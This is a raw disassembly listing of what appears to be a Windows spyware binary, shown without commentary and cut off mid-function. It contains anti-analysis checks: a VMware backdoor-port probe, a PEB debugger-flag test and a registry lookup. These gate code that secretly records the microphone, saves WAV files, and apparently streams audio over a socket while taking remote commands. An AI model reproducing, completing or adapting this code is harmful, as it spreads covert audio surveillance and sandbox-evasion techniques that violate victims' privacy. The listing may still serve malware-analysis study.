sub_401000
push ebx
push esi
mov esi rw-data
push edi
push 0x1c
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push 0x1
pop ebx
cmp [ eax ] bl
jne r-xdata
push 0x1d
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
call sub_4010f1
test al al
je r-xdata
push 0x1f
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
call sub_401102
test al al
je r-xdata
push ebx
call sub_401234
pop ecx
push 0x20
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
call sub_401178
test al al
je r-xdata
push ebx
call sub_401234
pop ecx
push 0x21
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
xor edi edi
cmp [ eax ] bl
jne r-xdata
call sub_4011a3
test al al
je r-xdata
push ebx
call sub_401234
pop ecx
push 0x22
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
jne r-xdata
push edi
push edi
push edi
push r-xdata
push edi
push edi
call [ CreateThread@IAT ]
push ebx
call sub_401234
pop ecx
pop edi
pop esi
xor eax eax
pop ebx
retn
push edi
push edi
push edi
push r-xdata
push edi
push edi
call [ CreateThread@IAT ]
sub_401102
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
and [ ebp - 0x4 ] 0x0
push edx
push ecx
push ebx
mov eax 0x564d5868
mov ebx 0x0
mov ecx 0xa
mov edx 0x5658
in eax dx
cmp ebx 0x564d5868
sete [ ebp - 0x1c ]
pop ebx
pop ecx
pop edx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_401178
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
push 0x0
push r--data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
neg eax
sbb al al
inc al
leave
retn
sub_4011a3
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
add eax 0x68
mov eax [ eax ]
cmp eax 0x70
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
setne al
leave
retn
sub_401234
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi rw-data
push r--data
push 0x2f
mov ecx edi
call sub_401289
mov esi [ std::operator==@IAT ]
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push r--data
push 0x2f
mov ecx edi
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
call [ exit@IAT ]
call sub_406988
sub_401289
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_4012b5
mov esi [ ebp + 0x8 ]
cmp eax esi
ja r-xdata
mov ecx edi
call sub_408633
shl esi 0x4
add eax esi
pop edi
pop esi
pop ebp
retn 0x4
mov ecx edi
call sub_4012c8
sub_4012c8
push ebp
mov ebp esp
sub esp 0x30
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x30 ]
push eax
call [ std::out_of_range::out_of_range@IAT ]
lea eax [ ebp - 0x30 ]
push r--data
push eax
call _CxxThrowException
sub_401384
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push 0x2
mov ecx rw-data
call sub_401afe
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4013c9
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push edi
movzx esi ax
movzx edi dx
shr esi 0x3
imul edi esi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ax
imul edi ecx
shr ax 0x3
mov [ rw-data ] edi
imul eax edx
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edi
mov [ rw-data ] 0x1
fild [ ebp - 0x8 ]
mov [ rw-data ] dx
mov [ rw-data ] ecx
mov [ rw-data ] ax
mov [ rw-data ] di
fmul [ r--data ]
call _ftol
imul esi eax
push 0x30008
push edi
push sub_401528
push rw-data
push 0xffffffff
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] esi
call [ waveInOpen@IAT ]
push edi
call sub_40147c
inc edi
pop ecx
cmp edi 0x2
jb r-xdata
push [ rw-data ]
call [ waveInStart@IAT ]
pop edi
pop esi
leave
retn
sub_40147c
push ebp
mov ebp esp
push esi
push edi
push [ rw-data ]
mov edi rw-data
mov ecx edi
push [ ebp + 0x8 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0x8 ]
mov ecx edi
shl esi 0x5
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx [ rw-data ]
push 0x20
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esi + eax + 0x4 ] ecx
mov ecx [ rw-data ]
xor eax eax
mov [ esi + ecx + 0x8 ] eax
mov ecx [ rw-data ]
mov [ esi + ecx + 0xc ] eax
mov ecx [ rw-data ]
mov [ esi + ecx + 0x10 ] eax
mov ecx [ rw-data ]
mov [ esi + ecx + 0x14 ] eax
mov eax [ rw-data ]
add eax esi
push eax
push [ rw-data ]
call [ waveInPrepareHeader@IAT ]
mov eax [ rw-data ]
push 0x20
add esi eax
push esi
push [ rw-data ]
call [ waveInAddBuffer@IAT ]
pop edi
pop esi
pop ebp
retn
sub_401528
push ebp
mov ebp esp
sub esp 0x94
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0xc ]
sub eax 0x3be
je r-xdata
and [ rw-data ] 0x0
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
leave
retn 0x14
cmp [ rw-data ] 0x1
jne r-xdata
push [ rw-data ]
mov ecx rw-data
call sub_401289
push eax
mov esi rw-data
lea eax [ ebp + 0xf ]
push esi
push eax
push 0x20
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x1 ]
push esi
push eax
push 0x12
push rw-data
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push esi
lea eax [ ebp - 0x54 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x84 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ rw-data ]
push 0x20
shl eax 0x5
add eax [ rw-data ]
push eax
push [ rw-data ]
call [ waveInUnprepareHeader@IAT ]
push [ rw-data ]
call sub_40147c
pop ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
push [ rw-data ]
call closesocket
and [ rw-data ] 0x0
push 0x0
call [ ExitThread@IAT ]
push eax
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402504
add esp 0x14
push eax
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4025ef
add esp 0x14
mov [ rw-data ] eax
jmp r-xdata
inc [ rw-data ]
cmp [ rw-data ] 0x2
jb r-xdata
sub_4016f6
push ebp
mov ebp esp
sub esp 0xa8
push esi
push edi
push 0x1
lea ecx [ ebp - 0xa8 ]
pop esi
push esi
push 0x22
push [ ebp + 0x8 ]
call [ std::basic_fstream<char,struct std::char_traits<char> >::basic_fstream<char,struct std::char_traits<char> >@IAT ]
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
imul eax ecx
mov edx eax
push 0x8
imul edx [ rw-data ]
shr edx 0x3
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] esi
cdq
pop esi
mov [ ebp - 0x14 ] 0x10
idiv esi
mov esi [ ebp + 0xc ]
push 0x0
push 0x0
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x4 ]
imul eax ecx
mov [ ebp - 0x10 ] eax
add eax 0x24
lea ecx [ ebp - 0xa0 ]
mov [ ebp + 0x8 ] eax
call [ std::basic_ostream<char,struct std::char_traits<char> >::seekp@IAT ]
push 0x4
lea ecx [ ebp - 0xa0 ]
pop edi
push edi
push r--data
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea eax [ ebp + 0x8 ]
push edi
push eax
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
push edi
push r--data
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
push edi
push r--data
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea eax [ ebp - 0x14 ]
push edi
push eax
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea eax [ ebp - 0xc ]
push 0x2
push eax
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
push 0x2
push rw-data
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
push edi
push rw-data
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea eax [ ebp - 0x4 ]
push edi
push eax
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea eax [ ebp - 0x8 ]
push 0x2
push eax
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
push 0x2
push rw-data
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
push edi
push r--data
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea eax [ ebp - 0x10 ]
push edi
push eax
lea ecx [ ebp - 0xa0 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
push [ esi + 0x4 ]
lea ecx [ ebp - 0xa0 ]
push [ esi ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea ecx [ ebp - 0xa8 ]
call [ std::basic_fstream<char,struct std::char_traits<char> >::close@IAT ]
lea ecx [ ebp - 0xa8 ]
call [ std::basic_fstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
pop edi
pop esi
leave
retn
sub_401883
push esi
push edi
xor edi edi
mov ecx rw-data
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ CreateDirectoryA@IAT ]
mov eax 0x1f40
push 0x24
mov ecx rw-data
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x8
mov [ rw-data ] eax
mov [ rw-data ] 0x1
mov [ rw-data ] di
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
imul eax eax 0x3c
mov ecx [ rw-data ]
mov [ esp ] 0x30008
imul ecx eax
movzx eax [ rw-data ]
shr eax 0x3
imul eax ecx
push edi
push sub_4019aa
push rw-data
push 0xffffffff
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] eax
call [ waveInOpen@IAT ]
push [ rw-data ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi rw-data
push 0x20
push esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
call [ waveInPrepareHeader@IAT ]
push 0x20
push esi
push [ rw-data ]
call [ waveInAddBuffer@IAT ]
push [ rw-data ]
call [ waveInStart@IAT ]
pop edi
xor eax eax
pop esi
retn 0x4
sub_4019aa
push ebp
mov ebp esp
sub esp 0xa8
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0xc ] 0x3c0
jne r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push esi
push eax
call [ time@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ localtime@IAT ]
push eax
push r--data
lea eax [ ebp - 0xa8 ]
push 0x50
push eax
call [ strftime@IAT ]
lea eax [ ebp - 0xa8 ]
push eax
call [ puts@IAT ]
add esp 0x1c
lea eax [ ebp + 0xf ]
lea ecx [ ebp - 0x48 ]
push r--data
push eax
lea eax [ ebp - 0xa8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push 0x5c
lea eax [ ebp - 0x38 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi rw-data
lea ecx [ ebp - 0x18 ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4016f6
pop ecx
pop ecx
push 0x20
push esi
push [ rw-data ]
call [ waveInUnprepareHeader@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0x20
push esi
push [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ waveInPrepareHeader@IAT ]
push 0x20
push esi
push [ rw-data ]
call [ waveInAddBuffer@IAT ]
pop esi
sub_401afe
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov al [ eax ]
mov esi ecx
push 0x0
push edi
mov [ esi ] al
call sub_401bb5
push [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x4 ] eax
push edi
push eax
call sub_401b8d
mov eax [ esi + 0x4 ]
shl edi 0x4
add eax edi
pop edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0xc
sub_401b3c
push esi
mov esi ecx
push [ esi + 0x8 ]
push [ esi + 0x4 ]
call sub_401b6b
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
push ecx
push eax
mov ecx esi
call sub_403626
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
pop esi
retn
sub_401b6b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x8
push esi
mov ecx edi
call sub_401bdc
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_401b8d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
test esi esi
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_401bc8
add [ ebp + 0x8 ] 0x10
dec esi
jne r-xdata
sub_401c04
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0x10
call sub_401c24
pop ecx
test eax eax
pop ecx
je r-xdata
pop ebp
retn
push [ ebp + 0xc ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_401c3b
push ebp
mov ebp esp
push esi
mov esi ecx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40fc2c
pop ecx
sub_401cbe
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
sub esp 0x10
mov edi rw-data
mov ecx esp
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40efb5
add esp 0x24
lea ecx [ ebp - 0x20 ]
push 0x0
call sub_401289
push eax
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi [ std::operator==@IAT ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x10 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x20 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
call sub_4052ec
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call sub_401b3c
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
xor eax eax
pop esi
leave
retn
push r--data
push esi
call sub_405546
push r--data
push esi
mov [ rw-data ] eax
call sub_405546
push r--data
push esi
mov [ rw-data ] eax
call sub_405546
push r--data
push esi
mov [ rw-data ] eax
call sub_405546
add esp 0x10
mov [ rw-data ] eax
mov esi esp
lea eax [ ebp - 0x30 ]
push rw-data
push edi
push r--data
push eax
mov [ rw-data ] 0x1
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
mov ecx [ ebp + 0x8 ]
add esp 0xc
call sub_402198
lea ecx [ ebp - 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
call [ rw-data ]
and [ rw-data ] 0x0
jmp r-xdata
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
call [ rw-data ]
test al al
mov [ rw-data ] al
je r-xdata
push 0x1
lea ecx [ ebp - 0x20 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
push [ ebp + 0x8 ]
call sub_401f3a
add esp 0xc
jmp r-xdata
call [ rw-data ]
test al al
mov [ rw-data ] al
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov esi esp
push rw-data
push edi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
mov ecx [ ebp + 0x8 ]
add esp 0xc
call sub_402198
lea ecx [ ebp - 0x30 ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov esi esp
push rw-data
push edi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
mov ecx [ ebp + 0x8 ]
add esp 0xc
call sub_402198
lea ecx [ ebp - 0x30 ]
push 0x1
lea ecx [ ebp - 0x20 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
mov esi eax
mov [ esp ] 0x3e8
call [ Sleep@IAT ]
push esi
push [ ebp + 0x8 ]
call sub_401f3a
pop ecx
pop ecx
call [ rw-data ]
jmp r-xdata
sub_401f3a
mov eax sub_40ffa0
call _EH_prolog
sub esp 0x84
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x14 ]
call [ rw-data ]
sub esp 0xc
mov edi esp
push rw-data
mov esi rw-data
push esi
lea eax [ ebp - 0x24 ]
push eax
push esi
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_40ed35
pop ecx
pop ecx
push eax
push esi
push r--data
lea eax [ ebp - 0x50 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x70 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x80 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x90 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx [ ebp + 0x8 ]
call sub_402198
lea ecx [ ebp - 0x90 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x80 ]
